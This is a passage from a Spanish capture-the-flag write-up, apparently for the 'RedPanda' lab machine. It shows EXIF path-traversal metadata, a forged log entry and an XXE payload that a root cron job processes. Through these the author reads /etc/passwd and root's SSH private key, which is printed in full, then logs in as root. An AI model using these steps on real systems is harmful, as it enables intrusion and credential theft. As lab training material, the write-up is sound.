<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ wget http://10.129.227.207:8080/img/greg.jpg
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ exiftool greg.jpg 
</span></span><span style="display:flex;"><span>ExifTool Version Number         : 12.57
</span></span><span style="display:flex;"><span>File Name                       : greg.jpg
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">103</span> kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2022:06:22 11:07:03+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:08:02 22:18:54+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:08:02 22:18:54+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : JPEG
</span></span><span style="display:flex;"><span>File Type Extension             : jpg
</span></span><span style="display:flex;"><span>MIME Type                       : image/jpeg
</span></span><span style="display:flex;"><span>Exif Byte Order                 : Big-endian <span style="color:#f92672">(</span>Motorola, MM<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Orientation                     : Horizontal <span style="color:#f92672">(</span>normal<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Artist                          : woodenk
</span></span><span style="display:flex;"><span>XMP Toolkit                     : XMP Core 4.4.0-Exiv2
</span></span><span style="display:flex;"><span>Document ID                     : gimp:docid:gimp:fdfbabec-5c75-44cd-9abc-0660f147312c
</span></span><span style="display:flex;"><span>Instance ID                     : xmp.iid:fa5469f5-219c-4d11-9329-67019e8b46d5
</span></span><span style="display:flex;"><span>Original Document ID            : xmp.did:3401fe2c-71a5-4894-895f-8a9822ccfb45
</span></span><span style="display:flex;"><span>Api                             : 2.0
</span></span><span style="display:flex;"><span>Platform                        : Windows
</span></span><span style="display:flex;"><span>Time Stamp                      : <span style="color:#ae81ff">1617795171484223</span>
</span></span><span style="display:flex;"><span>Version                         : 2.10.22
</span></span><span style="display:flex;"><span>Format                          : image/jpeg
</span></span><span style="display:flex;"><span>Creator Tool                    : GIMP 2.10
</span></span><span style="display:flex;"><span>Location Created                : 
</span></span><span style="display:flex;"><span>Location Shown                  : 
</span></span><span style="display:flex;"><span>Artwork Or Object               : 
</span></span><span style="display:flex;"><span>Registry ID                     : 
</span></span><span style="display:flex;"><span>History Action                  : saved
</span></span><span style="display:flex;"><span>History Changed                 : /
</span></span><span style="display:flex;"><span>History Instance ID             : xmp.iid:0a506af3-72a2-4843-8711-8117fc9329b9
</span></span><span style="display:flex;"><span>History Software Agent          : Gimp 2.10 <span style="color:#f92672">(</span>Windows<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>History When                    : 2021:04:07 12:32:51
</span></span><span style="display:flex;"><span>Image Supplier                  : 
</span></span><span style="display:flex;"><span>Image Creator                   : 
</span></span><span style="display:flex;"><span>Copyright Owner                 : 
</span></span><span style="display:flex;"><span>Licensor                        : 
</span></span><span style="display:flex;"><span>Profile CMM Type                : Little CMS
</span></span><span style="display:flex;"><span>Profile Version                 : 4.3.0
</span></span><span style="display:flex;"><span>Profile Class                   : Display Device Profile
</span></span><span style="display:flex;"><span>Color Space Data                : RGB
</span></span><span style="display:flex;"><span>Profile Connection Space        : XYZ
</span></span><span style="display:flex;"><span>Profile Date Time               : 2021:04:07 11:29:52
</span></span><span style="display:flex;"><span>Profile File Signature          : acsp
</span></span><span style="display:flex;"><span>Primary Platform                : Microsoft Corporation
</span></span><span style="display:flex;"><span>CMM Flags                       : Not Embedded, Independent
</span></span><span style="display:flex;"><span>Device Manufacturer             : 
</span></span><span style="display:flex;"><span>Device Model                    : 
</span></span><span style="display:flex;"><span>Device Attributes               : Reflective, Glossy, Positive, Color
</span></span><span style="display:flex;"><span>Rendering Intent                : Perceptual
</span></span><span style="display:flex;"><span>Connection Space Illuminant     : 0.9642 <span style="color:#ae81ff">1</span> 0.82491
</span></span><span style="display:flex;"><span>Profile Creator                 : Little CMS
</span></span><span style="display:flex;"><span>Profile ID                      : <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Profile Description             : GIMP built-in sRGB
</span></span><span style="display:flex;"><span>Profile Copyright               : Public Domain
</span></span><span style="display:flex;"><span>Media White Point               : 0.9642 <span style="color:#ae81ff">1</span> 0.82491
</span></span><span style="display:flex;"><span>Chromatic Adaptation            : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168
</span></span><span style="display:flex;"><span>Red Matrix Column               : 0.43604 0.22249 0.01392
</span></span><span style="display:flex;"><span>Blue Matrix Column              : 0.14305 0.06061 0.71393
</span></span><span style="display:flex;"><span>Green Matrix Column             : 0.38512 0.7169 0.09706
</span></span><span style="display:flex;"><span>Red Tone Reproduction Curve     : <span style="color:#f92672">(</span>Binary data <span style="color:#ae81ff">32</span> bytes, use -b option to extract<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Green Tone Reproduction Curve   : <span style="color:#f92672">(</span>Binary data <span style="color:#ae81ff">32</span> bytes, use -b option to extract<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Blue Tone Reproduction Curve    : <span style="color:#f92672">(</span>Binary data <span style="color:#ae81ff">32</span> bytes, use -b option to extract<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Chromaticity Channels           : <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>Chromaticity Colorant           : Unknown
</span></span><span style="display:flex;"><span>Chromaticity Channel <span style="color:#ae81ff">1</span>          : 0.64 0.33002
</span></span><span style="display:flex;"><span>Chromaticity Channel <span style="color:#ae81ff">2</span>          : 0.3 0.60001
</span></span><span style="display:flex;"><span>Chromaticity Channel <span style="color:#ae81ff">3</span>          : 0.15001 0.06
</span></span><span style="display:flex;"><span>Device Mfg Desc                 : GIMP
</span></span><span style="display:flex;"><span>Device Model Desc               : sRGB
</span></span><span style="display:flex;"><span>Image Width                     : <span style="color:#ae81ff">600</span>
</span></span><span style="display:flex;"><span>Image Height                    : <span style="color:#ae81ff">720</span>
</span></span><span style="display:flex;"><span>Encoding Process                : Progressive DCT, Huffman coding
</span></span><span style="display:flex;"><span>Bits Per Sample                 : <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>Color Components                : <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>Y Cb Cr Sub Sampling            : YCbCr4:4:4 <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> 1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Image Size                      : 600x720
</span></span><span style="display:flex;"><span>Megapixels                      : 0.432
</span></span></code></pre></div><p>Ahora editamos el campo <code>Artist</code> para hacer el Path Traversal para poder cargar el <code>pointed_creds.xml</code> y no el que debería de cargar.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ exiftool -Artist<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../../../../../tmp/pointed&#34;</span> pointed.jpg 
</span></span><span style="display:flex;"><span>Warning: <span style="color:#f92672">[</span>minor<span style="color:#f92672">]</span> Ignored empty rdf:Bag list <span style="color:#66d9ef">for</span> Iptc4xmpExt:LocationCreated - pointed.jpg
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span> image files updated
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ exiftool pointed.jpg | grep Artist
</span></span><span style="display:flex;"><span>Artist                          : ../../../../../tmp/pointed
</span></span></code></pre></div><p>Ahora nos descargamos la imagen y el XML con el payload en la máquina víctima en el directorio <code>/tmp/</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>woodenk@redpanda:/tmp$ wget http://10.10.14.80:8081/pointed.jpg
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>woodenk@redpanda:/tmp$ wget http://10.10.14.80:8081/pointed_creds.xml
</span></span></code></pre></div><p>Y solo falta modificar el <code>User-Agent</code> para poder escribir el log malicioso.</p>
<p><img src="images/Screenshot_11.png" alt="Write-up Image"></p>
<p>Aunque debe de ser una petición existosa.
Así que vamos a modificar el log directamente ya que tenemos acceso a la máquina víctima y permisos para poder modificar el archivo <code>redpanda.log</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>woodenk@redpanda:/opt/panda_search$ echo <span style="color:#e6db74">&#39;200||10.10.14.80||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/../../../../../../tmp/pointed.jpg&#39;</span> &gt; redpanda.log
</span></span><span style="display:flex;"><span>&lt;|/../../../../../../tmp/pointed.jpg<span style="color:#960050;background-color:#1e0010">&#39;</span> &gt; redpanda.log
</span></span><span style="display:flex;"><span>woodenk@redpanda:/opt/panda_search$ cat redpanda.log 
</span></span><span style="display:flex;"><span>cat redpanda.log 
</span></span><span style="display:flex;"><span>200<span style="color:#f92672">||</span>10.10.14.80<span style="color:#f92672">||</span>Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:102.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/102.0<span style="color:#f92672">||</span>/../../../../../../tmp/pointed.jpg
</span></span><span style="display:flex;"><span>woodenk@redpanda:/opt/panda_search$
</span></span></code></pre></div><p>Ahora cuando se ejecute la tarea CRON, lo que pasará es que al parsearse el log, la URL valdrá <code>/../../../../../../../tmp/pointed.jpg</code></p>
<p>Esto hará que se cree un <code>path</code> en <code>/opt/panda_search/src/main/resources/static/../../../../../../../tmp/pointed.jpg</code></p>
<p>Luego se leerá el metadato de la imagen que es <code>../../../../../../tmp/pointed</code> y creará la ruta <code>/credits/../tmp/pointed_creds.xml</code>
Esto leerá el XML con el payload por lo cual leerá el contenido del <code>/etc/passwd</code> y al intentar incrementar en &ldquo;1&rdquo; las visitas, se exportará el <code>/etc/passwd</code> en el campo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>woodenk@redpanda:/tmp$ cat pointed_creds.xml
</span></span><span style="display:flex;"><span>cat pointed_creds.xml
</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>?&gt;
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE root&gt;
</span></span><span style="display:flex;"><span>&lt;credits&gt;
</span></span><span style="display:flex;"><span>  &lt;author&gt;pointed&lt;/author&gt;
</span></span><span style="display:flex;"><span>  &lt;image&gt;
</span></span><span style="display:flex;"><span>    &lt;uri&gt;../../../../../../../pointed.jpg&lt;/uri&gt;
</span></span><span style="display:flex;"><span>    &lt;views&gt;root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span style="display:flex;"><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
</span></span><span style="display:flex;"><span>sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span style="display:flex;"><span>usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash
</span></span><span style="display:flex;"><span>mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false&lt;/views&gt;
</span></span><span style="display:flex;"><span>  &lt;/image&gt;
</span></span><span style="display:flex;"><span>  &lt;totalviews&gt;1&lt;/totalviews&gt;
</span></span><span style="display:flex;"><span>&lt;/credits&gt;
</span></span></code></pre></div><p>Y se acontece perfectamente el XXE.</p>
<p>Ahora vamos a intentar leer la id_rsa del usuario <code>root</code> , a ver si existe.
Solamente modificamos el archivo a leer
<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
<p>Agregamos de nuevo el log&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>woodenk@redpanda:/opt/panda_search$ echo <span style="color:#e6db74">&#39;200||10.10.14.80||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/../../../../../../tmp/pointed.jpg&#39;</span> &gt; redpanda.log
</span></span><span style="display:flex;"><span>&lt;|/../../../../../../tmp/pointed.jpg<span style="color:#960050;background-color:#1e0010">&#39;</span> &gt; redpanda.log
</span></span><span style="display:flex;"><span>woodenk@redpanda:/opt/panda_search$ cat redpanda.log 
</span></span><span style="display:flex;"><span>cat redpanda.log 
</span></span><span style="display:flex;"><span>200<span style="color:#f92672">||</span>10.10.14.80<span style="color:#f92672">||</span>Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:102.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/102.0<span style="color:#f92672">||</span>/../../../../../../tmp/pointed.jpg
</span></span><span style="display:flex;"><span>woodenk@redpanda:/opt/panda_search$
</span></span></code></pre></div><p>Y si leemos el archivo <code>/tmp/pointed_creds.xml</code> de nuevo&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>woodenk@redpanda:/opt/panda_search$ cat /tmp/pointed_creds.xml
</span></span><span style="display:flex;"><span>cat /tmp/pointed_creds.xml
</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>?&gt;
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE root&gt;
</span></span><span style="display:flex;"><span>&lt;credits&gt;
</span></span><span style="display:flex;"><span>  &lt;author&gt;pointed&lt;/author&gt;
</span></span><span style="display:flex;"><span>  &lt;image&gt;
</span></span><span style="display:flex;"><span>    &lt;uri&gt;../../../../../../../pointed.jpg&lt;/uri&gt;
</span></span><span style="display:flex;"><span>    &lt;views&gt;-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
</span></span><span style="display:flex;"><span>QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
</span></span><span style="display:flex;"><span>ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
</span></span><span style="display:flex;"><span>AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
</span></span><span style="display:flex;"><span>RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----&lt;/views&gt;
</span></span><span style="display:flex;"><span>  &lt;/image&gt;
</span></span><span style="display:flex;"><span>  &lt;totalviews&gt;1&lt;/totalviews&gt;
</span></span><span style="display:flex;"><span>&lt;/credits&gt;
</span></span></code></pre></div><p>Ya simplemente accedemos como <code>root</code> a la máquina víctima.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/redpanda/content<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ micro id_rsa
</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/redpanda/content<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ chmod <span style="color:#ae81ff">600</span> id_rsa 
</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/redpanda/content<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ ssh root@10.129.227.207 -i id_rsa
</span></span><span style="display:flex;"><span>....
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@redpanda:~# whoami
</span></span><span style="display:flex;"><span>root
</span></span><span style="display:flex;"><span>root@redpanda:~#
</span></span></code></pre></div><p>Y ya podríamos leer la flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@redpanda:~# cat root.txt
</span></span><span style="display:flex;"><span>885458dc9ef800f1...
</span></span></code></pre></div><p>Happy Hacking! 🚀</p>

    </div>

    

            </div>
        </div><footer class="text-center pb-1">
    <small class="text-muted">
        
            &copy; 2024, Andrés Del Cerro
        
        <br>
        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
    </small>
</footer>
</body>
</html>
